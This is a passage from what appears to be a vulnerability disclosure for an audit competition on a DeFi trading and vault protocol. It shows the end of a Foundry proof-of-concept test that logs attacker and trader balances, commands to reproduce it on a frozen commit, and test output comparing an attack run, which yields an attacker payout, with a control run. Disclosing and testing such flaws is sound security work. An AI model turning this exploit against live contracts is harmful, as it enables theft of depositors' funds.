        emit log_named_uint(string.concat(label, ".juniorShareSupply"), juniorVault.accruedTotalSupply());
        emit log_named_uint(string.concat(label, ".freePoolAssets"), pool.getFreeAssets());
        emit log_named_uint(string.concat(label, ".attackerJuniorShares"), juniorVault.balanceOf(ATTACKER));
        emit log_named_uint(string.concat(label, ".attackerWallet"), settlementToken.balanceOf(ATTACKER));
        emit log_named_uint(string.concat(label, ".attackerClearinghouseBalance"), clearinghouse.balanceAssets(ATTACKER));
        emit log_named_uint(string.concat(label, ".longASettlement"), clearinghouse.balanceAssets(LONG_A));
        emit log_named_uint(string.concat(label, ".longAClaim"), engine.traderClaimBalanceAssets(LONG_A));
        emit log_named_uint(string.concat(label, ".longBSettlement"), clearinghouse.balanceAssets(LONG_B));
        emit log_named_uint(string.concat(label, ".longBClaim"), engine.traderClaimBalanceAssets(LONG_B));
        emit log_named_uint(string.concat(label, ".shortASettlement"), clearinghouse.balanceAssets(SHORT_A));
        emit log_named_uint(string.concat(label, ".shortBSettlement"), clearinghouse.balanceAssets(SHORT_B));
        emit log_named_uint(string.concat(label, ".lossTraderSettlement"), clearinghouse.balanceAssets(LOSS_TRADER));
        emit log_named_uint(string.concat(label, ".lossTraderClaim"), engine.traderClaimBalanceAssets(LOSS_TRADER));
    }
}
```

## Clean-Checkout Reproduction

Use a checkout of the frozen commit and the accompanying standalone PoC file. No production source changes are needed for the vulnerable reproduction.

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
mkdir -p poc
# Place the accompanying SeniorHwmRecoveryDiversionPoC.t.sol file at:
# poc/SeniorHwmRecoveryDiversionPoC.t.sol
FOUNDRY_TEST=poc forge clean
FOUNDRY_TEST=poc forge test --offline \
  --match-path poc/SeniorHwmRecoveryDiversionPoC.t.sol \
  --match-test test_ProductionV3TradingCreatesWipeoutClaimAndPublicHwmDiversion -vv
```

Selected lines from the actual cold-build output (complete raw output is retained separately as local QA evidence):

```text
Compiling 172 files with Solc 0.8.35
Solc 0.8.35 finished in 68.69s
Compiler run successful with warnings:
Ran 1 test for poc/SeniorHwmRecoveryDiversionPoC.t.sol:SeniorHwmRecoveryDiversionPoCTest
[PASS] test_ProductionV3TradingCreatesWipeoutClaimAndPublicHwmDiversion() (gas: 30880023)
Logs:
  AFTER_FIRST_PARTIAL_RECAP.seniorHwm: 1000453063488
  AFTER_FIRST_PARTIAL_RECAP.pendingRecap: 500226531744
  AFTER_SECOND_ZERO_NAV_SETTLEMENT.poolAssets: 500226531744
  AFTER_SECOND_ZERO_NAV_SETTLEMENT.rawPoolTokenBalance: 500226531744
  AFTER_SECOND_ZERO_NAV_SETTLEMENT.accountedAssets: 500226531744
  AFTER_SECOND_ZERO_NAV_SETTLEMENT.seniorPrincipal: 500226531744
  AFTER_SECOND_ZERO_NAV_SETTLEMENT.seniorHwm: 500226531744
  AFTER_SECOND_ZERO_NAV_SETTLEMENT.juniorPrincipal: 0
  AFTER_SECOND_ZERO_NAV_SETTLEMENT.pendingRecap: 0
  AFTER_SECOND_ZERO_NAV_SETTLEMENT.unassigned: 0
  ATTACK_AFTER_TRADER_LOSS.realizedPoolGain: 146625840973
  ATTACK.seniorPrincipal: 500226531744
  ATTACK.seniorHwm: 500226531744
  ATTACK.juniorPrincipal: 125056632936
  ATTACK.unassigned: 0
  ATTACK.poolAssets: 625283164680
  ATTACK.poolTokenBalance: 625283164680
  ATTACK.juniorEscrowAssets: 0
  ATTACK.attackerPayout: 21569208037
  ATTACK.attackerInvestment: 1000000000000
  ATTACK.pendingRedeemQuote: 125056486601
  ATTACK.totalTraderClaims: 0
  ATTACK.accountedAssets: 625283164680
  CONTROL.seniorPrincipal: 646852372717
  CONTROL.seniorHwm: 1000453063488
  CONTROL.juniorPrincipal: 0
  CONTROL.unassigned: 0
  CONTROL.poolAssets: 646852372717
  CONTROL.attackerPayout: 0
  CONTROL.accountedAssets: 646852372717
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 88.48ms (79.06ms CPU time)
Ran 1 test suite in 90.62ms (88.48ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

